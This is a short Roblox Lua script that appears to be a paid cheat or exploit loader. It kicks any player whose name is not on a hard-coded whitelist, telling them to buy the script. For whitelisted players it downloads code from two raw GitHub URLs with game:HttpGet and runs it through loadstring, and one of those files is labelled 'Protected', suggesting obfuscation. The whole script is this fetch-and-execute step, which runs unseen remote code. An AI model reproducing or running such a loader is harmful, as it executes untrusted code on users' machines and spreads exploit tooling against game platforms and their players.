-- List of whitelisted player names
local whitelist = {
["your"] = true,
["baconman143krich"]= true,
["Anthonyz_ohhhhh8"]= true,
["nono"]= true,
["example"]= true,
}

-- Function to check if a player is whitelisted
local function isWhitelisted(player)
    return whitelist[player.Name] == true
end

-- Function to handle player joining
game.Players.PlayerAdded:Connect(function(player)
    if not isWhitelisted(player) then
        player:Kick("You are not whitelisted please buy the script!")
    else
        print(player.Name .. " has joined the game.")
        -- Activate loadstring for whitelisted players
loadstring(game:HttpGet("https://raw.githubusercontent.com/Ianasmite/Pogisimark/main/Vamp.ggopw", true))()
    end
end)

-- Check existing players
for _, player in ipairs(game.Players:GetPlayers()) do
    if not isWhitelisted(player) then
        player:Kick("You are not whitelisted please buy the script!")
    else
        -- Activate loadstring for  players
    loadstring(game:HttpGet("https://raw.githubusercontent.com/noGlxcka/lua/main/Protected_1366052659630308.lua.txt"))()
    end
end
